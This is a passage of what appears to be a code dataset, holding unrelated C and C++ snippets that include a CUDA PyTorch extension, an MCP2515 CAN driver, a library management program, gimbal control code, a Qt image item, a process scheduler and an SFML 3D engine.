0;\n                lastMatchedY = y;\n            }\n\n            size_t transposition = distances[getPos(x1, y1)] + (x - x1 - 1) + 1 + (y - y1 - 1);\n            size_t substitution = distances[getPos(x, y)] + cost;\n            size_t insertion = distances[getPos(x, y + 1)] + 1;\n            size_t deletion = distances[getPos(x + 1, y)] + 1;\n\n            // It's mo",
    "#include <torch/extension.h>\n\n#include <c10/cuda/CUDAGuard.h>\n#include <c10/cuda/CUDAStream.h>\n\n#include <memory>\n#include <vector>\n\n#include \"common.h\"\n\nvoid run_sample_segments_kernel(    \n    const torch::Tensor &depth,\n    const torch::Tensor &points,\n    const torch::Tensor &pix_to_face, \n    const torch::Tensor &tri_to_tetra, \n    const torch::Tensor &tris,\n    const torch::Tensor &n_samples_per_ray,\n    const torch::Tensor &packed_cumsum,\n    const int n_samples,\n    const int n_tetras,\n    const int n_rays,\n    const int buffer_size,\n    float *t_starts,\n    float *t_ends,\n    int *tetra_indices,\n    int *ray_indices,\n    float *barys,\n    int *packed_info,\n    cudaStream_t stream\n);\n\nstd::vector<torch::Tensor> sample_segments(        \n    torch::Tensor depth, \n    torch::Tensor points,\n    torch::Tensor pix_to_face, \n    torch::Tensor tri_to_tetra, \n    torch::Tensor tetra,\n    torch::Tensor n_samples_per_ray,\n    torch::Tensor packed_cumsum,\n    int n_samples,\n    int n_tetras,\n    int n_rays,\n    int buffer_size,\n    torch::Tensor t_starts,\n    torch::Tensor t_ends,\n    torch::Tensor tetra_indices,\n    torch::Tensor ray_indices,\n    torch::Tensor barys,\n    torch::Tensor packed_info)\n{\n    cudaStream_t stream = c10::cuda::getCurrentCUDAStream();\n\n    CHECK_INPUT(depth);\n    CHECK_INPUT(points);\n    CHECK_INPUT(pix_to_face);\n    CHECK_INPUT(tri_to_tetra);\n    CHECK_INPUT(tetra);\n    CHECK_INPUT(n_samples_per_ray);\n    CHECK_INPUT(packed_cumsum);\n    CHECK_INPUT(t_starts);\n    CHECK_INPUT(t_ends);\n    CHECK_INPUT(ray_indices);\n    CHECK_INPUT(tetra_indices);\n    CHECK_INPUT(barys);\n    CHECK_INPUT(packed_info);\n\n    run_sample_segments_kernel(\n        depth,\n        points,\n        pix_to_face,\n        tri_to_tetra,\n        tetra,\n        n_samples_per_ray,\n        packed_cumsum,\n        n_samples,\n        n_tetras,\n        n_rays,\n        buffer_size,\n        t_starts.data_ptr<float>(),\n        t_ends.data_ptr<float>(),\n        tetra_indices.data_ptr<int>(),\n        ray_indices.data_ptr<int>(),\n        barys.data_ptr<float>(),\n        packed_info.data_ptr<int>(),\n        stream\n    );\n\n    return {};\n}\n\nPYBIND11_MODULE(TORCH_EXTENSION_NAME, m)\n{\n    m.def(\"sample\", &sample_segments, \"Sample segmetns using rasterizer\");\n}\n",
    "#include <torch/extension.h>\n#include <ATen/TensorIterator.h>\n\n\nat::TensorIterator build_iterator_11(const at::Tensor& result, const at::Tensor& z) {\n  return (\n    at::TensorIteratorConfig()\n    .set_check_mem_overlap(true)\n    .allow_cpu_scalars(true)\n    .enforce_safe_casting_to_output(true)\n    .add_output(result)\n    .add_input(z)\n  ).build();\n}\n\n\nat::TensorIterator build_iterator_12(const at::Tensor& result, const at::Tensor& v, const at::Tensor& z) {\n  return (\n    at::TensorIteratorConfig()\n    .set_check_mem_overlap(true)\n    .allow_cpu_scalars(true)\n    .promote_inputs_to_common_dtype(true)\n    .cast_common_dtype_to_outputs(true)\n    .enforce_safe_casting_to_output(true)\n    .promote_integer_inputs_to_float(true)\n    .add_output(result)\n    .add_input(v)\n    .add_input(z)\n  ).build();\n}\n\nat::TensorIterator build_iterator_21(const at::Tensor& result1, const at::Tensor& result2, const at::Tensor& z) {\n  return (\n    at::TensorIteratorConfig()\n    .set_check_mem_overlap(true)\n    .allow_cpu_scalars(true)\n    .enforce_safe_casting_to_output(true)\n    .add_output(result1)\n    .add_output(result2)\n    .add_input(z)\n  ).build();\n}\n\n\nat::TensorIterator build_iterator_22(const at::Tensor& result1, const at::Tensor& result2, const at::Tensor& v, const at::Tensor& z) {\n  return (\n    at::TensorIteratorConfig()\n    .set_check_mem_overlap(true)\n    .allow_cpu_scalars(true)\n    .promote_inputs_to_common_dtype(true)\n    .cast_common_dtype_to_outputs(true)\n    .enforce_safe_casting_to_output(true)\n    .promote_integer_inputs_to_float(true)\n    .add_output(result1)\n    .add_output(result2)\n    .add_input(v)\n    .add_input(z)\n  ).build();\n}\n",
    "/* Longest Sub-Array with Sum K(https://www.geeksforgeeks.org/problems/longest-sub-array-with-sum-k0809/1):\n\nGiven an array arr containing n integers and an integer k.\nYour task is to find the length of the longest Sub-Array with the sum of the elements equal to the given value k. */\n\n// The most Optimal Approach when the array consist only [zeroes and postive elements]\n// doesn't work if array consist neg elements.\n#include <bits/stdc++.h>\nusing namespace std;\n\nclass Solution {\npublic:\n    int lenOfLongestSubArr(int arr[], int n, int k) {\n        int left = 0, right = 0;\n        int preSum = arr[0];\n        int maxLen = 0;\n\n        while (right < n) {\n            while (preSum > k and left <= right) {\n                preSum -= arr[left];\n                left++;\n            }\n            if (preSum == k)\n                maxLen = max(maxLen, right - left + 1);\n\n            right++;\n            if (right < n)\n                preSum += arr[right];\n        }\n\n        return maxLen;\n    }\n};\nint main() {\n    int n;\n    cin >> n;\n    int arr[n];\n    for (int i = 0; i < n; i++)\n        cin >> arr[i];\n    int k;\n    cin >> k;\n    Solution sol;\n    int ans = sol.lenOfLongestSubArr(arr, n, k);\n    cout << ans;\n\n    return 0;\n}",
    "/*\n  mcp_can.cpp\n  2012 Copyright (c) Seeed Technology Inc.  All right reserved.\n  2017 Copyright (c) Cory J. Fowler  All Rights Reserved.\n\n  Author: Loovee\n  Contributor: Cory J. Fowler\n  2017-09-25\n  This library is free software; you can redistribute it and/or\n  modify it under the terms of the GNU Lesser General Public\n  License as published by the Free Software Foundation; either\n  version 2.1 of the License, or (at your option) any later version.\n\n  This library is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n  Lesser General Public License for more details.\n\n  You should have received a copy of the GNU Lesser General Public\n  License along with this library; if not, write to the Free Software\n  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-\n  1301  USA\n*/\n#include \"mcp2515.h\"\n\n#define spi_readwrite mcpSPI->transfer\n#define spi_read() spi_readwrite(0x00)\n\n/*********************************************************************************************************\n** Function name:           mcp2515_reset\n** Descriptions:            Performs a software reset\n*********************************************************************************************************/\nvoid MCP_CAN::mcp2515_reset(void)                                      \n{\n    mcpSPI->beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));\n    MCP2515_SELECT();\n    spi_readwrite(MCP_RESET);\n    MCP2515_UNSELECT();\n    mcpSPI->endTransaction();\n    delay(5); // If the MCP2515 was in sleep mode when the reset command was issued then we need to wait a while for it to reset properly\n}\n\n/*********************************************************************************************************\n** Function name:           mcp2515_readRegister\n** Descriptions:            Read data register\n*********************************************************************************************************/\nINT8U MCP_CAN::mcp2515_readRegister(const INT8U address)                                                                     \n{\n    INT8U ret;\n\n    mcpSPI->beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));\n    MCP2515_SELECT();\n    spi_readwrite(MCP_READ);\n    spi_readwrite(address);\n    ret = spi_read();\n    MCP2515_UNSELECT();\n    mcpSPI->endTransaction();\n\n    return ret;\n}\n\n/*********************************************************************************************************\n** Function name:           mcp2515_readRegisterS\n** Descriptions:            Reads successive data registers\n*********************************************************************************************************/\nvoid MCP_CAN::mcp2515_readRegisterS(const INT8U address, INT8U values[], const INT8U n)\n{\n    INT8U i;\n    mcpSPI->beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));\n    MCP2515_SELECT();\n    spi_readwrite(MCP_READ);\n    spi_readwrite(address);\n    // mcp2515 has auto-increment of address-pointer\n    for (i=0; i<n; i++) \n        values[i] = spi_read();\n\n    MCP2515_UNSELECT();\n    mcpSPI->endTransaction();\n}\n\n/*********************************************************************************************************\n** Function name:           mcp2515_setRegister\n** Descriptions:            Sets data register\n*********************************************************************************************************/\nvoid MCP_CAN::mcp2515_setRegister(const INT8U address, const INT8U value)\n{\n    mcpSPI->beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));\n    MCP2515_SELECT();\n    spi_readwrite(MCP_WRITE);\n    spi_readwrite(address);\n    spi_readwrite(value);\n    MCP2515_UNSELECT();\n    mcpSPI->endTransaction();\n}\n\n/*********************************************************************************************************\n** Function name:           mcp2515_setRegisterS\n** Descriptions:            Sets successive data registers\n*********************************************************************************************************/\nvoid MCP_CAN::mcp2515_setRegisterS(const INT8U address, const INT8U values[], const INT8U n)\n{\n    INT8U i;\n    mcpSPI->beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));\n    MCP2515_SELECT();\n    spi_readwrite(MCP_WRITE);\n    spi_readwrite(address);\n       \n    for (i=0; i<n; i++) \n        spi_readwrite(values[i]);\n  \n    MCP2515_UNSELECT();\n    mcpSPI->endTransaction();\n}\n\n/*********************************************************************************************************\n** Function name:           mcp2515_modifyRegister\n** Descriptions:            Sets specific bits of a register\n*********************************************************************************************************/\nvoid MCP_CAN::mcp2515_modifyRegister(const INT8U address, const INT8U mask, const INT8U data)\n{\n    mcpSPI->beginTransaction(SPISettings(10000000, MSBFIRST,",
    "\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\nusing namespace std;\n\n// Structure to store book details\nstruct Book {\n    int bookID;\n    string title;\n    string author;\n    int quantity;\n};\n\n// Function prototypes\nvoid addBook(vector<Book>& books);\nvoid searchBook(const vector<Book>& books);\nvoid displayBooks(const vector<Book>& books);\nvoid saveToFile(const vector<Book>& books);\nvoid loadFromFile(vector<Book>& books);\n\nint main() {\n    vector<Book> books;\n    loadFromFile(books);\n\n    int choice;\n    //sxjsggswjswgjswgjsgjs\n    do {\n        cout << \"\\nLibrary Management System\\n\";\n        cout << \"1. Add a New Book\\n\";\n        cout << \"2. Search for a Book\\n\";\n        cout << \"3. Display All Books\\n\";\n        cout << \"4. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            addBook(books);\n            break;\n        case 2:\n            searchBook(books);\n            break;\n        case 3:\n            displayBooks(books);\n            break;\n        case 4:\n            saveToFile(books);\n            cout << \"Exiting program...\\n\";\n            break;\n        default:\n            cout << \"Invalid choice. Please try again.\\n\";\n        }\n    } while (choice != 4);\n\n    return 0;\n}\n\n// Function to add a new book\nvoid addBook(vector<Book>& books) {\n    Book newBook;\n    cout << \"Enter Book ID: \";\n    cin >> newBook.bookID;\n    cin.ignore();\n    cout << \"Enter Book Title: \";\n    getline(cin, newBook.title);\n    cout << \"Enter Author Name: \";\n    getline(cin, newBook.author);\n    cout << \"Enter Quantity: \";\n    cin >> newBook.quantity;\n\n    books.push_back(newBook);\n    cout << \"Book added successfully!\\n\";\n}\n\n// Function to search for a book\nvoid searchBook(const vector<Book>& books) {\n    int searchID;\n    string searchTitle;\n    cout << \"Search by:\\n1. Book ID\\n2. Book Title\\nEnter your choice: \";\n    int choice;\n    cin >> choice;\n\n    if (choice == 1) {\n        cout << \"Enter Book ID: \";\n        cin >> searchID;\n        for (const auto& book : books) {\n            if (book.bookID == searchID) {\n                cout << \"Book Found:\\n\";\n                cout << \"ID: \" << book.bookID << \", Title: \" << book.title\n                     << \", Author: \" << book.author << \", Quantity: \" << book.quantity << \"\\n\";\n                return;\n            }\n        }\n    } else if (choice == 2) {\n        cin.ignore();\n        cout << \"Enter Book Title: \";\n        getline(cin, searchTitle);\n        for (const auto& book : books) {\n            if (book.title == searchTitle) {\n                cout << \"Book Found:\\n\";\n                cout << \"ID: \" << book.bookID << \", Title: \" << book.title\n                     << \", Author: \" << book.author << \", Quantity: \" << book.quantity << \"\\n\";\n                return;\n            }\n        }\n    }\n\n    cout << \"Book not found.\\n\";\n}\n\n// Function to display all books\nvoid displayBooks(const vector<Book>& books) {\n    if (books.empty()) {\n        cout << \"No books available in the inventory.\\n\";\n        return;\n    }\n\n    cout << \"\\nAvailable Books:\\n\";\n    for (const auto& book : books) {\n        cout << \"ID: \" << book.bookID << \", Title: \" << book.title\n             << \", Author: \" << book.author << \", Quantity: \" << book.quantity << \"\\n\";\n    }\n}\n\n// Function to save books to a file\nvoid saveToFile(const vector<Book>& books) {\n    ofstream file(\"books.txt\");\n    if (file.is_open()) {\n        for (const auto& book : books) {\n            file << book.bookID << \",\" << book.title << \",\" << book.author << \",\" << book.quantity << \"\\n\";\n        }\n        file.close();\n        cout << \"Books saved to file successfully.\\n\";\n    } else {\n        cout << \"Error opening file for writing.\\n\";\n    }\n}\n\n// Function to load books from a file\nvoid loadFromFile(vector<Book>& books) {\n    ifstream file(\"books.txt\");\n    if (file.is_open()) {\n        Book book;\n        string line;\n        while (getline(file, line)) {\n            size_t pos = 0;\n            pos = line.find(\",\");\n            book.bookID = stoi(line.substr(0, pos));\n            line.erase(0, pos + 1);\n\n            pos = line.find(\",\");\n            book.title = line.substr(0, pos);\n            line.erase(0, pos + 1);\n\n            pos = line.find(\",\");\n            book.author = line.substr(0, pos);\n            line.erase(0, pos + 1);\n\n            book.quantity = stoi(line);\n\n            books.push_back(book);\n        }\n        file.close();\n        cout << \"Books loaded from file successfully.\\n\";\n    } else {\n        cout << \"No existing file found. Starting fresh.\\n\";\n    }\n}\n\n",
    "#include <iostream>\n#include <pkg/Gimbal.hpp>\n\nusing namespace transport;\n\nBuffer setGimbal(uint8_t mode, float pitch_angle, float yaw_angle, float pitch_speed, float yaw_speed)\n{\n    Buffer data_to_send(8);\n\n    // angle\n    pitch_angle = pitch_angle < 0 ? pitch_angle + 2 * PI : pitch_angle;\n    yaw_angle = yaw_angle < 0 ? yaw_angle + 2 * PI : yaw_angle;\n\n    pitch_angle = pitch_angle > 2 *PI ? pitch_angle -= 2 * PI : pitch_angle;\n    yaw_angle = yaw_angle > 2 *PI ? yaw_angle -= 2 * PI : yaw_angle;\n\n    // speed\n    pitch_speed = std::fabs(pitch_speed) > PI ? (pitch_speed > 0 ? PI : -PI) : pitch_speed;\n    yaw_speed = std::fabs(yaw_speed) > PI ? (yaw_speed > 0 ? PI : -PI) : yaw_speed;\n\n    int16_t s_pitch = (2047 * pitch_speed) / (2 * PI);\n    int16_t s_yaw = (2047 * yaw_speed) / (2 * PI);\n\n    s_pitch = s_pitch > 2047 ? 2047 : (s_pitch < -2048 ? -2048 : s_pitch);\n    s_yaw = s_yaw > 2047 ? 2047 : (s_yaw < -2048 ? -2048 : s_yaw);\n\n    data_to_send[0] = mode;\n    data_to_send[1] = (uint8_t)s_yaw;\n    data_to_send[2] = (uint8_t)((((uint16_t)s_yaw >> 8) & 0x0f) | (uint8_t)(s_pitch << 4));\n    data_to_send[3] = (uint8_t)((uint16_t)s_pitch >> 4);\n    data_to_send[4] = (uint8_t)((uint16_t)(yaw_angle / PI * 180 / 360 * 65535));\n    data_to_send[5] = (uint8_t)((uint16_t)(yaw_angle / PI * 180 / 360 * 65535) >> 8);\n    data_to_send[6] = (uint8_t)((uint16_t)(pitch_angle / PI * 180 / 360 * 65535));\n    data_to_send[7] = (uint8_t)((uint16_t)(pitch_angle / PI * 180 / 360 * 65535) >> 8);\n\n    return data_to_send;\n    // canBus->sendFrame(data_to_send);\n}\n\nwmj::GimbalPose lastpose;\nint circlecnt = 0;\nauto getGimbal(Buffer data_from_read)\n{\n    uint16_t timestamp = 0, roll_angle = 0, yaw_angle = 0, pitch_angle = 0;\n    static bool poseInit = false;\n    timestamp = (uint16_t)data_from_read[0] | (uint16_t)data_from_read[1] << 8;\n    yaw_angle = (uint16_t)data_from_read[2] | (uint16_t)data_from_read[3] << 8;\n    pitch_angle = (uint16_t)data_from_read[4] | (uint16_t)data_from_read[5] << 8;\n    roll_angle = (uint16_t)data_from_read[6] | (uint16_t)data_from_read[7] << 8;\n\n    float fpitch = (float)pitch_angle / 65535.f * 2 * PI;\n    float fyaw = (float)yaw_angle / 65535.f * 2 * PI - 2 * PI;\n    float froll = (float)roll_angle / 65535.f * 2 * PI;\n\n    wmj::GimbalPose cur_pose{fpitch, fyaw, froll};\n    cur_pose.timestamp = timestamp;\n    if (!poseInit)\n    {\n        lastpose = cur_pose;\n        poseInit = true;\n    }\n    if (std::fabs(lastpose.yaw - cur_pose.yaw) > PI)\n    {\n        if (cur_pose.yaw - lastpose.yaw > 0)\n            circlecnt++;\n        else\n            circlecnt--;\n    }\n    lastpose = cur_pose;\n    cur_pose.yaw = cur_pose.yaw - circlecnt * 2.f * PI;\n    cur_pose.pitch = cur_pose.pitch > PI ? cur_pose.pitch - 2 * PI : cur_pose.pitch;\n\n    float data[4] = {cur_pose.pitch, cur_pose.yaw, 0, 0};\n    return std::vector<float>(data, data + 4);\n}\nint main(int argc, char* argv[])\n{\n    GimbalPackage gimbal_package;\n    Buffer buffer;\n    gimbal_package.SetGimbalAngle(-1.35, 2.24);\n    gimbal_package.SetGimbalSpeed(-2.35, -2.24);\n    buffer << gimbal_package;\n    std::cout << buffer.toString() << std::endl;\n    buffer = setGimbal(0x77, -1.35, 2.24, -2.35, -2.24);\n    std::cout << buffer.toString() << std::endl;\n\n    gimbal_package << buffer;\n    auto gimbal = gimbal_package.GetGimbalAngle();\n    std::cout << \"pitch=\" << gimbal.pitch << \" yaw=\" << gimbal.yaw << std::endl;\n    auto gimbal_vec = getGimbal(buffer);\n    std::cout << \"pitch=\" << gimbal_vec[0] << \" yaw=\" << gimbal_vec[1] << std::endl;\n    return 0;\n}",
    "#include \"ui/image_item.hpp\"\n\n#include <exception>\n\n#include <QImage>\n#include <QSGImageNode>\n#include <QSGNode>\n\n#include \"utils/exception.hpp\"\n\nnamespace verre::ui {\n\nImageItem::ImageItem() {\n    setFlag(Flag::ItemHasContents);\n}\n\nQSGNode* ImageItem::updatePaintNode(QSGNode* node_, UpdatePaintNodeData* /*data*/) {\n    QSGImageNode* node = static_cast<QSGImageNode*>(node_);\n    try {\n        if (!node) {\n            node = window()->createImageNode();\n            if (!node)\n                throw Exception{\"Could not create image node\"};\n            node->setOwnsTexture(true);\n        }\n\n        node->setRect(boundingRect());\n\n        auto texture = window()->createTextureFromImage(image_);\n        if (!texture)\n            throw Exception{\"Could not create texture\"};\n        node->setTexture(texture);\n\n        return node;\n    }\n    catch (const std::exception& ex) {\n        if (node != node_)\n            delete node;\n        throw;\n    }\n}\n\nvoid ImageItem::update_image(QImage image) {\n    image_ = std::move(image);\n    update();\n}\n\n}  // namespace verre::ui\n",
    "#include <stdio.h>\r\n#include <stdlib.h>\r\ntypedef struct\r\n{\r\n    int process_id;\r\n    float thoi_gian_den;\r\n    float thoi_gian_thuc_hien;\r\n    float thoi_gian_cho;\r\n    float thoi_gian_luot_quay;\r\n} TienTrinh;\r\n\r\nstruct Node_tien_trinh\r\n{\r\n    TienTrinh data;\r\n    Node_tien_trinh *next;\r\n};\r\n\r\nstruct Hang_Doi\r\n{\r\n    Node_tien_trinh *front;\r\n    Node_tien_trinh *rear;\r\n};\r\n\r\nbool Hang_Doi_Rong(Hang_Doi hang_doi);\r\nTienTrinh Nhap_Tien_Trinh();\r\nvoid Swap(TienTrinh &a, TienTrinh &b);\r\nvoid Sort(Hang_Doi &hangdoi);\r\nvoid Them_Tien_Trinh(Hang_Doi *hangdoi, TienTrinh tientrinh);\r\nint Doc_dulieu(char *FileName, Hang_Doi *hangdoi);\r\nvoid Xuat_Tien_Trinh(Hang_Doi hang_doi);\r\nvoid Menu( Hang_Doi &hangdoi, TienTrinh &tientrinh){\r\n    char filename[] = \"TienTrinh.txt\";\r\n    int chon;\r\n    while(true){\r\n        system(\"cls\");\r\n        printf(\"\\t\\t1. Nhap tien trinh\\n\");\r\n        printf(\"\\t\\t2. Xuat tien trinh\\n\");\r\n        printf(\"\\t\\t3. Doc du lieu tu file\\n\");\r\n        printf(\"\\t\\t0. Thoat chuong trinh\\n\");\r\n        printf(\"Nhap lua chon: \"); scanf(\"%d\", &chon);\r\n        switch (chon)\r\n        {\r\n            case 0:{\r\n                printf(\"Cam on ban\\n\");\r\n                system(\"pause\");\r\n                break;\r\n            }\r\n            case 1:{\r\n                tientrinh = Nhap_Tien_Trinh();\r\n                Them_Tien_Trinh(&hangdoi, tientrinh);\r\n                system(\"pause\");\r\n                break;\r\n            }\r\n            case 2:{\r\n                Xuat_Tien_Trinh(hangdoi);\r\n                system(\"pause\");\r\n                break;\r\n            }\r\n            case 3:{\r\n                Doc_dulieu(filename, &hangdoi);\r\n                system(\"pause\");\r\n                break;\r\n            }\r\n            default:{\r\n                printf(\"Khong co yeu cau %d\\n\", chon);\r\n                system(\"pause\");\r\n                break;\r\n            }\r\n        }\r\n    } \r\n}\r\n\r\nint main(){\r\n    Hang_Doi hangdoi;\r\n    TienTrinh tientrinh;\r\n    Menu(hangdoi, tientrinh);\r\n    return 0;\r\n}\r\n\r\nbool Hang_Doi_Rong(Hang_Doi hang_doi)\r\n{\r\n    if (hang_doi.front == NULL)\r\n        return true;\r\n    return false;\r\n};\r\nTienTrinh Nhap_Tien_Trinh()\r\n{\r\n    TienTrinh tientrinh;\r\n    printf(\"Nhap thoi gian den: \");\r\n    scanf(\"%f\", &tientrinh.thoi_gian_den);\r\n    printf(\"Nhap thoi gian thuc hien: \");\r\n    scanf(\"%f\", &tientrinh.thoi_gian_thuc_hien);\r\n    return tientrinh;\r\n};\r\nvoid Swap(TienTrinh &a, TienTrinh &b){\r\n    float temp = a.thoi_gian_den;\r\n    a.thoi_gian_den = b.thoi_gian_den;\r\n    b.thoi_gian_den = temp;\r\n\r\n    temp = a.thoi_gian_thuc_hien;\r\n    a.thoi_gian_thuc_hien = b.thoi_gian_thuc_hien;\r\n    b.thoi_gian_thuc_hien = temp;\r\n}\r\nvoid Sort(Hang_Doi &hangdoi) {\r\n    bool KT;\r\n    do {\r\n        KT = false;\r\n        Node_tien_trinh *p = hangdoi.front;\r\n        while (p->next != NULL) {\r\n            if (p->data.thoi_gian_den > p->next->data.thoi_gian_den) {\r\n                Swap(p->data, p->next->data);\r\n                KT = true;\r\n            }\r\n            p = p->next;\r\n        }\r\n    } while (KT);\r\n}\r\nvoid Them_Tien_Trinh(Hang_Doi *hangdoi, TienTrinh tientrinh)\r\n{\r\n    Node_tien_trinh *newNode = new Node_tien_trinh();\r\n    if (newNode == NULL)\r\n    {\r\n        printf(\"Khong the them tien trinh!!!\\n\");\r\n        exit(1);\r\n    }\r\n\r\n    newNode->data = tientrinh;\r\n\r\n    newNode->next = NULL;\r\n    if (Hang_Doi_Rong(*hangdoi))\r\n    {\r\n        hangdoi->front = hangdoi->rear = newNode;\r\n        hangdoi->front->data.process_id = 1;\r\n    }\r\n    else\r\n    {\r\n        newNode->data.process_id = hangdoi->rear->data.process_id + 1;\r\n        hangdoi->rear->next = newNode;\r\n        hangdoi->rear = newNode;\r\n    }\r\n};\r\nint Doc_dulieu(char *FileName, Hang_Doi *hangdoi)\r\n{\r\n    FILE *file = fopen(FileName, \"r\");\r\n    if (file == NULL)\r\n    {\r\n        printf(\"Khong the mo file %s\", FileName);\r\n        return 0;\r\n    }\r\n    float thoi_gian_den, thoi_gian_thuc_hien;\r\n    TienTrinh tientrinh;\r\n    while (fscanf(file, \"%f%f\", &thoi_gian_den, &thoi_gian_thuc_hien) == 2)\r\n    {\r\n        tientrinh.thoi_gian_den = thoi_gian_den;\r\n        tientrinh.thoi_gian_thuc_hien = thoi_gian_thuc_hien;\r\n        Them_Tien_Trinh(hangdoi, tientrinh);\r\n    }\r\n    fclose(file);\r\n    printf(\"Doc File thanh cong.\\n\");\r\n    return 1;\r\n}\r\nvoid Xuat_Tien_Trinh(Hang_Doi hang_doi)\r\n{\r\n    Sort(hang_doi);\r\n    float thoi_gian_hien_tai = 0;\r\n    float thoi_gian_cho = 0;\r\n    float thoi_gian_luot_quay = 0;\r\n    int so_tien_trinh = 0;\r\n    Node_tien_trinh *tien_trinh = hang_doi.front;\r\n\r\n    printf(\"Tien Trinh\\tThoi Gian Den\\tThoi Gian Thuc Hien\\tThoi Gian Cho\\tThoi Gian Luot Quay\\n\");\r\n    while (tien_trinh)\r\n    {\r\n        if (thoi_gian_hien_tai <= tien_trinh->data.thoi_gian_den)\r\n            thoi_gian_hien_tai = tien_trinh->data.thoi_gian_den;\r\n\r\n        thoi_gian_cho += thoi_gian_hien_tai - tien_trinh->data.thoi_gian_den;\r\n        thoi_gian_luot_quay += thoi_gian_hien_tai - tien_trinh->data.thoi_gian_den + tien_trinh->data.thoi_gian_thuc_hien;\r\n\r\n        tien_trinh->data.thoi_gian",
    "// Made by PM-Kirill\n\n#include <SFML/Graphics.hpp>\n#include <algorithm>\n#include <iostream>\n#include \"mesh.hpp\"\nusing namespace std;\nusing namespace sf;\n\nint main()\n{\n    vec3 camera_loc(0, -2.0, -5);\n    mat4x4 proj_mat = mat4x4::get_proj_mat(1920, 1080, 0.1, 1000, 90);\n\n    mesh TestMesh;\n    if (!TestMesh.load_from_file((char*)\"3dbenchy.obj\")) return 0;\n\n    float theta = 0; \n\n    bool outline_only = false;\n    bool allow_mouse_movement = false;\n    bool allow_rotation = true;\n\n    bool keys[6] = { 0, 0, 0, 0, 0, 0 };\n\n    vec3 look_dir(0, 0, 1);\n    vec3 up_dir(0, 1, 0);\n\n    vec3 light_dir(1, -0.5, -0.7);\n    light_dir.norm();\n\n    Clock clock_for_movement;\n    Clock clock_for_FPS;\n\n    const int WINDOW_HEIGHT = 1080;\n    const int WINDOW_WIDTH = 1920;\n\n    Vector2i mouse_offset;\n\n    RenderWindow window(VideoMode(WINDOW_WIDTH, WINDOW_HEIGHT), \"3D Engine by PM-Kirill\");\n    window.setVerticalSyncEnabled(true);\n    Mouse::setPosition(Vector2i(WINDOW_WIDTH / 2, WINDOW_HEIGHT / 2), window);\n    window.setMouseCursorVisible(false);\n    allow_mouse_movement = true;\n\n    while (window.isOpen())\n    {\n        Event event;\n        while (window.pollEvent(event))\n        {\n            switch (event.type)\n            {\n            case Event::Closed: window.close(); break;\n            case Event::KeyPressed:\n                if (event.key.code == Keyboard::Escape) window.close();\n                if (event.key.code == Keyboard::W) keys[0] = true;\n                if (event.key.code == Keyboard::A) keys[1] = true;\n                if (event.key.code == Keyboard::S) keys[2] = true;\n                if (event.key.code == Keyboard::D) keys[3] = true;\n                if (event.key.code == Keyboard::Space) keys[4] = true;\n                if (event.key.code == Keyboard::LShift) keys[5] = true;\n                if (event.key.code == Keyboard::Tab) outline_only = !outline_only;\n                if (event.key.code == Keyboard::LControl) allow_mouse_movement = !allow_mouse_movement;\n                if (event.key.code == Keyboard::R) allow_rotation = !allow_rotation;\n                break;\n            case Event::KeyReleased:\n                if (event.key.code == Keyboard::W) keys[0] = false;\n                if (event.key.code == Keyboard::A) keys[1] = false;\n                if (event.key.code == Keyboard::S) keys[2] = false;\n                if (event.key.code == Keyboard::D) keys[3] = false;\n                if (event.key.code == Keyboard::Space) keys[4] = false;\n                if (event.key.code == Keyboard::LShift) keys[5] = false;\n                break;\n            case Event::MouseMoved:\n                if (allow_mouse_movement)\n                {\n                    mouse_offset.x = event.mouseMove.x - WINDOW_WIDTH / 2;\n                    mouse_offset.y = event.mouseMove.y - WINDOW_HEIGHT / 2;\n                    Mouse::setPosition(Vector2i(WINDOW_WIDTH / 2, WINDOW_HEIGHT / 2), window);\n                }\n                break;\n            default: break;\n            }\n        }\n\n        if (clock_for_movement.getElapsedTime().asMilliseconds() >= 10)\n        {\n            vec3 vel(0, 0, 0);\n            if (keys[0]) vel += vec3(0, 0, 0.1);\n            if (keys[1]) vel += vec3(-0.1, 0, 0);\n            if (keys[2]) vel += vec3(0, 0, -0.1);\n            if (keys[3]) vel += vec3(0.1, 0, 0);\n            if (keys[4]) vel += vec3(0, -0.1, 0);\n            if (keys[5]) vel += vec3(0, 0.1, 0);\n\n            vec3 temp_dir(look_dir.x, 0, look_dir.z);\n            temp_dir.norm();\n            float phi = acos(dot_prod(temp_dir, vec3(0, 0, 1)));\n            phi = (temp_dir.x < 0) ? phi : -phi;\n            vec3 rot_vel = vel * mat4x4::get_rot_y(phi);\n            camera_loc += rot_vel;\n            clock_for_movement.restart();\n        }\n\n        look_dir = look_dir * mat4x4::get_rot_y(-mouse_offset.x * 0.005);\n        vec3 hor_dir(look_dir.x, 0, look_dir.z);\n        hor_dir.norm();\n        float phi = acos(dot_prod(hor_dir, vec3(0, 0, 1)));\n        phi = (hor_dir.x < 0) ? -phi : phi;\n        vec3 temp_dir = look_dir * mat4x4::get_rot_y(phi);\n        temp_dir = temp_dir * mat4x4::get_rot_x(-mouse_offset.y * 0.005);\n        look_dir = temp_dir * mat4x4::get_rot_y(-phi);\n        look_dir.norm();\n        vec3 target = camera_loc + look_dir;\n        mouse_offset = Vector2i(0, 0);\n        mat4x4 view_mat = mat4x4::get_point_at_mat(camera_loc, target, up_dir);\n        view_mat.invert();\n\n        window.clear(Color::White);\n\n        vector<triangle> to_draw;\n        for (auto t : TestMesh.tris)\n        {\n            triangle new_tri, proj;\n            for (int k = 0; k < 3; k++)\n            {\n                new_tri.p[k] = t.p[k] * mat4x4::get_rot_y(theta * 1.5);\n                new_tri.p[k] = new_tri.p[k] * mat4x4::get_rot_z(3.1415);\n            }\n\n            new_tri.normal = cross_prod(new_tri.p[2] - new_tri.p[0], new_tri.p[1] - new_tri.p[0]);\n            new_tri.normal.norm();\n\n            vec3 cam_dir = (new_tri.p[0]+new_tri.p[1]+new_tri.p[2])/3 - ",
